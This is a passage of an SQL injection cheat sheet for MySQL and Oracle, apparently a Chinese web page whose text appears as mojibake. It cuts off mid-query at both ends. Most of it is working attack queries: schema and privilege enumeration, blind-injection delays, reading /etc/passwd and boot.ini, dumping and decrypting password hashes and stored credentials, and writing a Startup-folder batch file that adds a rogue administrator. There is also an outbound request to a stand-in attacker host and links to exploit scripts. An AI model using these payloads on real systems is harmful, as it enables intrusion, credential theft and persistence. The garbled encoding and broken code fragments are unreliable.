<span class="token keyword">TABLE</span> localfile<span class="token punctuation">(</span><span class="token keyword">data</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">BULK</span> <span class="token keyword">INSERT</span> localfile <span class="token keyword">FROM</span> <span class="token string">'c:\boot.ini'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="MySQL-å¤‡å¿˜å•"><a href="#MySQL-å¤‡å¿˜å•" class="headerlink" title="MySQL å¤‡å¿˜å•"></a>MySQL å¤‡å¿˜å•</h4><ol><li>æšä¸¾æ•°æ®åº“é…ç½®ä¿¡æ¯å’Œæ¨¡å¼</li></ol><p>æå–MySQLæœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>ç‰ˆæœ¬</td><td><code>SELECT @@version;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·</td><td><code>SELECT user();</code><br><code>SELECT system user();</code></td></tr><tr><td>åˆ—å‡ºç”¨æˆ·</td><td><code>SELECT user FROM mysql.user;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·æƒé™</td><td><code>SELECT grantee, privilege_type, is_grantable FROM information_schema.user privileges;</code></td></tr></tbody></table><p>æå–MySQL 5.0åŠä¹‹åç‰ˆæœ¬çš„æ¨¡å¼ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å½“å‰æ•°æ®åº“</td><td><code>SELECT database();</code></td></tr><tr><td>åˆ—å‡ºæ•°æ®åº“</td><td><code>SELECT schema name FROM information  schema.schemata;</code></td></tr><tr><td>åˆ—å‡ºè¡¨</td><td>åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­çš„è¡¨ï¼š  <br><code>UNION SELECT TABLE_NAME FROM  information_schema.tables WHERE  TABLE_SCHEMA= database();  </code><br>åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ï¼š <br><code> SELECT table_schema, tabble_name FROM information_schema.tables  WHERE table_schema!= 'information_schema' AND table_schema !='mysql</code></td></tr><tr><td>åˆ—å‡ºåˆ—</td><td>åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­tblUsersè¡¨çš„åˆ—åï¼š  <br><code>SELECT column_name FROM information_schema.columns  WHERE  table_name='tblUsers'  #è¿”å› tblUsers è¡¨æ‰€æœ‰åˆ—çš„åˆ—å  </code><br>åˆ—å‡ºæ‰€æœ‰ç”¨æˆ·å®šä¹‰çš„æ•°æ®åº“ä¸­çš„æ‰€æœ‰åˆ—ï¼š  <br><code>SELECT table_schema, tabble_name, column_name FROM information_schema.columns WHERE table_schema != 'information_schema' AND table schema !='mysql'</code></td></tr></tbody></table><ol start="2"><li>SQLç›²æ³¨å‡½æ•°:MySQL</li></ol><p>SQLç›²æ³¨å‡½æ•°</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥  è¯¢</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²é•¿åº¦</td><td><code>LENGTH()</code></td></tr><tr><td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æå–å­ä¸²</td><td><code>SELECT SUBSTR(string, offset, length);</code></td></tr><tr><td>å­—ç¬¦ä¸²(â€˜ABCâ€™)ä¸å¸¦å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td><td><code>SELECT char(65,66,67);</code></td></tr><tr><td>è§¦å‘æ—¶é—´å»¶è¿Ÿ</td><td><code>BENCHMARK(1000000,MD5("HACK"));  #è§¦å‘ä¸€ä¸ªå¯åº¦é‡çš„æ—¶é—´å»¶è¿Ÿ </code><br><code> SLEEP(10);  #è§¦å‘ä¸€ä¸ª10ç§’çš„æ—¶é—´å»¶è¿Ÿ(MySQL 5ä»¥åŠæ›´é«˜ç‰ˆæœ¬)</code></td></tr><tr><td>IFè¯­å¥</td><td><code>SELECT if (1=1,'A','B'); -- è¿”å›'A'</code></td></tr></tbody></table><ol start="3"><li>æ”»å‡»æ•°æ®åº“æœåŠ¡å™¨ï¼šMySQL</li></ol><ul><li>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li></ul><p>å¯ä»¥é€šè¿‡åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªå®šæœŸæ‰§è¡Œçš„æ¶æ„è„šæœ¬æ–‡ä»¶æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚ä¸‹åˆ—è¯­å¥ç”¨äºä»MySQLè¯»å–å†…å®¹å¹¶å°†å…¶å†™å…¥æœ¬åœ°æ–‡ä»¶ä¸­</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">SBLECT <span class="token string">'system_commands'</span> <span class="token keyword">INTO</span> <span class="token keyword">dumpfile</span> trojanpath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥çš„è¯­å¥ä¼šåœ¨Windowså¯åŠ¨ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶ï¼Œç”¨äºæ·»åŠ ä¸€ä¸ªå£ä»¤ä¸ºxçš„ç®¡ç†å‘˜ç”¨æˆ·X</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'net user x x /add%26%26 net localgroup administrators x /add'</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'c:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\attack.bat'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ç ´è§£æ•°æ®åº“å£ä»¤</li></ul><p>è¿”å›ä¸€ä¸ªä»¥å†’å·åˆ†éš”çš„ç”¨æˆ·åå’Œå£ä»¤å“ˆå¸Œå€¼çš„åˆ—è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ç›´æ¥æ”»å‡»æ•°æ®åº“</li></ul><p>Windowsï¼š <a href="http://www.scoobygang.org/HiDDenWarez/mexec.pl">www.scoobygang.org/HiDDenWarez/mexec.pl</a></p><p>Windowsï¼š <a href="http://www.0xdeadbeef.info/exploits/raptor_winudf.tgz">www.0xdeadbeef.info/exploits/raptor_winudf.tgz</a></p><p>åŸºäº UNIXï¼š <a href="http://www.0xdeadbeef.infb/exploits/raptor_udf.c">www.0xdeadbeef.infb/exploits/raptor_udf.c</a></p><ul><li>è¯»å–æ–‡ä»¶</li></ul><p>æŸ¥çœ‹UNIXä¸»æœºä¸Šçš„/etc/passwdæ–‡ä»¶</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ç”¨äº† MAGIC_QUOTES_GPC,å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä»£è¡¨è¯¥æ–‡ä»¶è·¯å¾„ä»¥é¿å…ä½¿ç”¨å•å¼•å·å­—ç¬¦</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span><span class="token number">0x2f6574632f706173737764</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#åŠ è½½/etc/passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>å†™å…¥æ–‡ä»¶</li></ul><p>ä»mytableè¡¨ä¸­è¿”å›æ‰€æœ‰æ•°æ®ï¼Œå¹¶å°†è¾“å‡ºå†™å…¥åˆ°/tmp/hackerä¸­</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> mytable <span class="token keyword">INTO</span> <span class="token keyword">dumpfile</span> <span class="token string">'/tmp/hacker'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Oracle-å¤‡å¿˜å•"><a href="#Oracle-å¤‡å¿˜å•" class="headerlink" title="Oracle å¤‡å¿˜å•"></a>Oracle å¤‡å¿˜å•</h4><ol><li>æšä¸¾æ•°æ®åº“é…ç½®ä¿¡æ¯å’Œæ¨¡å¼</li></ol><p>æå–OracleæœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>ç‰ˆæœ¬</td><td><code>SELECT banner FROM v$version;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·</td><td><code>SELECT user FROM dual;</code></td></tr><tr><td>åˆ—å‡ºç”¨æˆ·</td><td><code>SELECT username FROM all users ORDER BY username;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·æƒé™</td><td><code>SELECT * FROM user role_privs;</code> <br><code>SELECT * FROM user_tab_privs;</code><br> <code> SELECT * FROM user_sys_privs;</code><br> <code>SELECT sys_context('USERENV','ISDBA') FROM dual;</code><br><code>SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';</code></td></tr><tr><td>åº”ç”¨æœåŠ¡å™¨ä¸»æœºå</td><td><code>SELECT sys_context('USERENV','HOST') FROM dual;</code><br><code>SELECT sys_context('USERENV','SERVER_HOST') FROM dual;</code></td></tr><tr><td>æ•°æ®åº“æœåŠ¡å™¨ä¸»æœºå</td><td><code>SELECT UTL_INADDR.get_host_name FROM dual</code></td></tr><tr><td>å»ºç«‹å¤–éƒ¨è¿æ¥</td><td>`SELECT utl_http.request(â€˜<a href="http://attacker:1000/">http://attacker:1000/</a>â€˜</td></tr><tr><td>å¼•å‘é”™è¯¯</td><td>å¼•å‘åŒ…å«ç‰ˆæœ¬æ ‡å¿—çš„é”™è¯¯  <br><code>AND (utl_inaddr.get_host_name((select banner from v$version where rownum=1)))=1</code></td></tr></tbody></table><p>æå–Oracleæ•°æ®åº“çš„æ¨¡å¼ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>æ•°æ®åº“å</td><td><code>SELECT global_name FROM global_name;</code></td></tr><tr><td>åˆ—å‡ºæ¨¡å¼/ç”¨æˆ·</td><td><code>SELECT username FROM all_users;</code></td></tr><tr><td>åˆ—å‡ºè¡¨ååŠå…¶æ¨¡å¼</td><td><code>SELECT ower,table_name FROM all_users;</code></td></tr><tr><td>åˆ—å‡ºåˆ—</td><td><code>SELECT ower, table_name, column_name FROM all_tab_columns WHERE table_name= 'tblUsers';</code></td></tr></tbody></table><p>æ•°æ®åº“ä¸­çš„åŠ å¯†ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>ç»è¿‡åŠ å¯†çš„è¡¨</td><td><code>SELECT table_name, column_name,  encryption_alg, salt FROM  dba_encrypted_columns;</code> <br> ä»Oracle 10gå¼€å§‹ï¼Œå¯ä»¥å¯¹è¡¨ä½¿ç”¨é€æ˜åŠ å¯†ã€‚è€ƒè™‘åˆ°æ€§èƒ½åŸå› ï¼Œé€šå¸¸åªå¯¹æœ€é‡è¦çš„åˆ—è¿›è¡ŒåŠ å¯†</td></tr><tr><td>åˆ—å‡ºä½¿ç”¨åŠ å¯†åº“çš„å¯¹è±¡</td><td><code>SELECT owner, name, type, referenced_name  FROM all_dependencies;</code><br>  æ˜¾ç¤ºä½¿ç”¨äº†æ•°æ®åº“åŠ å¯†çš„å¯¹è±¡(ä¾‹å¦‚ï¼ŒDBMS_CRYPTOå’ŒDBMS_OBFUSCATION_TOOLKITä¸­çš„å¯†ç )</td></tr><tr><td>åˆ—å‡ºåŒ…å«â€™cryptâ€™å­—ç¬¦ä¸²çš„PL/SQLå‡½æ•°</td><td><code>SELECT  owner,object_name,procedure_name  FROM all_procedures where  (lower(object_name) LIKE '%crypt%' or lower(procedure_name) like '%crypt%') AND object_name not in ('DBMS OBFUSCATION  TOOLKIT','DBMS_CRYPTO_TOOLKIT')</code></td></tr></tbody></table><ol start="2"><li>SQLç›²æ³¨å‡½æ•°ï¼šOracle</li></ol><p>SQLç›²æ³¨å‡½æ•°</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥  è¯¢</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²é•¿åº¦</td><td><code>LENGTH()</code></td></tr><tr><td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æ å–å­ä¸²</td><td><code>SELECT SUBSTR(string,offset,length) FROM dual;</code></td></tr><tr><td>å­—ç¬¦ä¸²ï¼ˆâ€™ABCâ€™ï¼‰ä¸å¸¦ å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td><td>`SELECT chr(65)</td></tr><tr><td>è§¦å‘æ—¶é—´å»¶è¿Ÿ</td><td><code>SELECT UTL_INADDR.get_host_address('nowhere999.zom') FROM dual;  -- è§¦å‘å¯åº¦é‡çš„æ—¶é—´å»¶è¿Ÿ</code></td></tr></tbody></table><ol start="3"><li>æ”»å‡»æ•°æ®åº“æœåŠ¡å™¨ï¼šOracle</li></ol><p>Oracleä¸­å­˜åœ¨ä¸¤ç§ä¸åŒç±»å‹çš„æ³¨å…¥ï¼šä¼ ç»ŸSQLæ³¨å…¥å’ŒPL/SQLæ³¨å…¥ã€‚åœ¨PL/SQLæ³¨å…¥ä¸­ï¼Œ å¯ä»¥æ‰§è¡Œæ•´ä¸ªPL/SQLå—ï¼›è€Œåœ¨ä¼ ç»Ÿçš„SQLæ³¨å…¥ä¸­ï¼Œé€šå¸¸åˆ™åªèƒ½ä¿®æ”¹å•æ¡SQLè¯­å¥ã€‚</p><ul><li>å‘½ä»¤æ‰§è¡Œ</li></ul><p>ä½¿ç”¨ä¸‹åˆ—è„šæœ¬å®ç°ç³»ç»Ÿå‘½ä»¤çš„æ‰§è¡Œå’Œæœ¬åœ°æ–‡ä»¶çš„è¯»/å†™è®¿é—®:</p><p><a href="http://www.0xdeadbeef.infb/exploits/raptor_oraexec.sql">www.0xdeadbeef.infb/exploits/raptor_oraexec.sql</a></p><p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">www.0xdeadbeef.info/exploits/raptor_oraextproc.sql</a></p><ul><li>è¯»æœ¬åœ°æ–‡ä»¶</li></ul><p>ä»OracleæœåŠ¡å™¨è¯»å–æœ¬åœ°æ–‡ä»¶</p><p>è¯»æœ¬åœ°æ–‡ä»¶ï¼šXMLType</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> directory GETPWDIR <span class="token keyword">as</span> <span class="token string">'C:\APP\ROOT\PRODUCT\11.1.0\DB_1\OWB\J2EE\CONFIG'</span><span class="token punctuation">;</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@user'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'/'</span><span class="token operator">||</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connectionâ€”factory/@password'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'@'</span><span class="token operator">||</span>substr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>instr<span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token keyword">value</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'/connection-factory/@url'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'//'')+2) connFROM table(XMLSequence(extract(xmltype(bfilename('</span>GETPWDIR<span class="token string">','</span><span class="token keyword">data</span><span class="token operator">-</span>sources<span class="token punctuation">.</span>xml<span class="token string">'),nls_charset_id('</span>WE8ISO8859P1<span class="token string">'))/'</span><span class="token operator">/</span><span class="token keyword">data</span><span class="token operator">-</span>sources<span class="token operator">/</span>connection<span class="token operator">-</span>pool<span class="token operator">/</span>connection<span class="token operator">-</span>factory'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯»æœ¬åœ°æ–‡ä»¶ï¼šOracle Text</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> files <span class="token punctuation">(</span>id NUMBER <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>path VARCHR<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token keyword">UNIQUE</span><span class="token punctuation">,</span>ot_format <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> files <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'c:\boot.ini'</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- å°†å‡†å¤‡è¦è¯»å–çš„åˆ—æ’å…¥åˆ°è¡¨ä¸­(æ¯”å¦‚é€šè¿‡SQLæ³¨å…¥è¯»å–)</span><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> file_index <span class="token keyword">ON</span> files<span class="token punctuation">(</span>path<span class="token punctuation">)</span> INDEXTYPE <span class="token operator">IS</span> ctxsys<span class="token punctuation">.</span>contextPARAMETERS<span class="token punctuation">(</span><span class="token string">'datastore ctxsys.file_datastore format column ot_format'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- ä»å…¨æ–‡ç´¢å¼•æ£€ç´¢æ•°æ®(boot.ini)</span><span class="token keyword">SELECT</span> token_text <span class="token keyword">from</span> dr$fi1e_index$i<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è¯»æœ¬åœ°æ–‡ä»¶(ä»…é™äºPL/SQLæ³¨å…¥)</li></ul><p>ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“æ¥æ‰§è¡ŒPL/SQLå—ï¼š</p><p>è¯»æœ¬åœ°æ–‡ä»¶ï¼šdbms_lob</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';DECLAREbuf varchar2(4096);BEGINLob_loc:= BFILENAME(1MEDIA_DIR'</span><span class="token punctuation">,</span><span class="token string">'aht.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">OPEN</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> DBMS_LOB<span class="token punctuation">.</span>LOB_READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">READ</span> <span class="token punctuation">(</span>Lob_loc<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>dbms_output<span class="token punctuation">.</span>put_line<span class="token punctuation">(</span>utl_raw<span class="token punctuation">.</span>cast_to_varchar2<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>DBMS_LOB<span class="token punctuation">.</span><span class="token keyword">CLOSE</span><span class="token punctuation">(</span>Lob_loc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">*</span> via <span class="token keyword">external</span> <span class="token keyword">table</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> products_ext<span class="token punctuation">(</span>prod_id NUMBER<span class="token punctuation">,</span> prod_name VARCHAR2<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prod_desc VARCHAR2<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>prod_category VARCHAR2<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span> prod_category_desc VARCHAR2<span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>list_price NUMBER<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> min_price NUMBER<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> last_updated <span class="token keyword">DATE</span><span class="token punctuation">)</span><span class="token keyword">ORGANIZATION</span> <span class="token keyword">EXTERNAL</span><span class="token punctuation">(</span><span class="token keyword">TYPE</span> oracle_loader<span class="token keyword">DEFAULT</span> <span class="token keyword">DIRECTORY</span> stage_dirACCESS <span class="token keyword">PARAMETERS</span><span class="token punctuation">(</span>RECORDS DELIMITED <span class="token keyword">BY</span> NEWLINEBADFILE ORAHOME<span class="token operator">:</span><span class="token string">'.rhosts'</span>LOGFILE ORAHOME<span class="token operator">:</span><span class="token string">'log_products_ext'</span>FIELDS TERMINATED <span class="token keyword">BY</span> <span class="token string">','</span>MISSING FIELD <span class="token keyword">VALUES</span> ARE <span class="token keyword">NULL</span><span class="token punctuation">(</span>prod_id<span class="token punctuation">,</span> prod_name<span class="token punctuation">,</span> prod_desc<span class="token punctuation">,</span> prod_category<span class="token punctuation">,</span> prod_category_desc<span class="token punctuation">,</span> price<span class="token punctuation">,</span> price_delta<span class="token punctuation">,</span>last_updated <span class="token keyword">char</span> date_format <span class="token keyword">date</span> mask <span class="token string">"dd-mon-yyyy"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>LOCATION <span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>PARALLEL <span class="token number">5</span>REJECT <span class="token keyword">LIMIT</span> UNLIMITED<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å†™æœ¬åœ°æ–‡ä»¶(ä»…é™äºPL/SQLæ³¨å…¥)</li></ul><p>é€šè¿‡SQL*Plusç­‰å®¢æˆ·ç«¯æ¥ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“ã€‚</p><p>å†™æœ¬åœ°æ–‡æœ¬æ–‡ä»¶ï¼šutl_file</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';DECLAREv_file UTL_FILE.FILE_TYPE;BEGINv_file:= UTL_FILE.FOPEN('</span>EXT<span class="token string">', '</span>aht<span class="token punctuation">.</span>txt<span class="token string">','</span>w<span class="token string">');UTL_FILE.PUT_LINE(v_file, '</span><span class="token keyword">first</span> <span class="token keyword">row</span><span class="token string">');UTL_FILE.NEW_LINE(v_file);UTL_FILE.PUT_LINE(v)file,'</span><span class="token keyword">second</span> <span class="token keyword">row</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>FCLOSE<span class="token punctuation">(</span>v_file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†™æœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼šutl file</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">Create</span> <span class="token keyword">or</span> replace <span class="token keyword">directory</span> ext <span class="token keyword">AS</span> <span class="token string">'C:\';Create or replace directory ext AS '</span><span class="token keyword">C</span><span class="token operator">:</span>\'<span class="token punctuation">;</span><span class="token keyword">DECLARE</span> fi UTL_FILE<span class="token punctuation">.</span>FILE_TYPE<span class="token punctuation">;</span>bu <span class="token keyword">RAW</span><span class="token punctuation">(</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">BEGIN</span>bu<span class="token operator">:=</span>hextoraw<span class="token punctuation">(</span><span class="token string">'BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fi<span class="token operator">:=</span>UTL_FILE<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">'EXT'</span><span class="token punctuation">,</span> <span class="token string">'hello.com'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>put_raw<span class="token punctuation">(</span>fi<span class="token punctuation">,</span>bu<span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>fi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†™æœ¬åœ°æ–‡ä»¶ï¼šdbms_advisor(Oracle 10gåŠä¹‹åçš„ç‰ˆæœ¬)</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">create</span> <span class="token keyword">directory</span> MYDIR <span class="token keyword">as</span> <span class="token string">'C:\';exec SYS.DBMS_ADVISOR.CREATE_FILE('</span>This <span class="token keyword">is</span> <span class="token keyword">the</span>content<span class="token string">'||chr(13)||'</span>Next line<span class="token string">','</span>MYDIR<span class="token string">','</span>myfile<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>ç ´è§£æ•°æ®åº“å£ä»¤</li></ul><p>ä»æ•°æ®åº“ä¸­æå–å£ä»¤å“ˆå¸Œï¼š</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">SELECT</span> <span class="token keyword">name</span><span class="token punctuation">,</span> password <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>user$ <span class="token keyword">where</span> <span class="token keyword">type</span>#<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token keyword">and</span><span class="token keyword">length</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">;</span><span class="token comment">--DES Hashes (7-10g)</span><span class="token keyword">SELECT</span> <span class="token keyword">name</span><span class="token punctuation">,</span> spare4 <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>user$ <span class="token keyword">where</span> <span class="token keyword">type</span>#<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token keyword">length</span><span class="token punctuation">(</span>spare4<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">62</span><span class="token punctuation">;</span> <span class="token comment">--SHA1 Hashes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æå–æ˜æ–‡å£ä»¤ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> view_username<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>view_password<span class="token punctuation">)</span> <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_view_user_credentials<span class="token punctuation">;</span><span class="token keyword">select</span> credential_set_column<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>credential_value<span class="token punctuation">)</span> <span class="token keyword">from</span> 